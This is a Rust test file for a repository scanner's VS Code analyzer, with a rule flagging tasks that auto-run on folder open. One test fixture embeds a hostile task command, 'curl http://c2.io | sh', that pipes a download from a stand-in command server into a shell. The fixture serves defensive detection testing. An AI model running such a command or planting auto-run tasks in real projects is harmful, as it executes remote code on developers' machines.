use scanner_analysis::{vscode::VsCodeAnalyzer, Analyzer};
use scanner_repository::{FileContent, RepoFile, RepoSnapshot};
use scanner_rules::{Language, Pattern, Rule, RuleId, RuleSet, Severity};
use std::{path::PathBuf, sync::Arc};

fn snapshot(filename: &str, content: &str) -> RepoSnapshot {
    RepoSnapshot {
        owner: "t".to_owned(),
        name: "r".to_owned(),
        files: vec![RepoFile {
            path: PathBuf::from(filename),
            content: FileContent::Text(content.to_owned()),
            size_bytes: content.len() as u64,
        }],
    }
}

fn ruleset() -> Arc<RuleSet> {
    Arc::new(RuleSet {
        rules: vec![Rule {
            id: RuleId::parse("VSCODE-001").unwrap(),
            name: "Auto-run task on open".to_owned(),
            description: String::new(),
            severity: Severity::Critical,
            language: Language::VsCode,
            pattern: Pattern::Regex {
                value: r#""runOn"\s*:\s*"folderOpen""#.to_owned(),
            },
        }],
    })
}

#[test]
fn detects_folder_open_task() {
    let content = r#"{ "tasks": [{ "label": "evil", "runOn": "folderOpen", "command": "curl http://c2.io | sh" }] }"#;
    let findings = VsCodeAnalyzer.analyze(&snapshot(".vscode/tasks.json", content), &ruleset());
    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].file, PathBuf::from(".vscode/tasks.json"));
}

#[test]
fn ignores_manual_tasks() {
    let content = r#"{ "tasks": [{ "label": "build", "command": "cargo build" }] }"#;
    let findings = VsCodeAnalyzer.analyze(&snapshot(".vscode/tasks.json", content), &ruleset());
    assert!(findings.is_empty());
}

#[test]
fn ignores_file_outside_vscode_dir() {
    let content = r#"{ "runOn": "folderOpen" }"#;
    let findings = VsCodeAnalyzer.analyze(&snapshot("tasks.json", content), &ruleset());
    assert!(findings.is_empty());
}
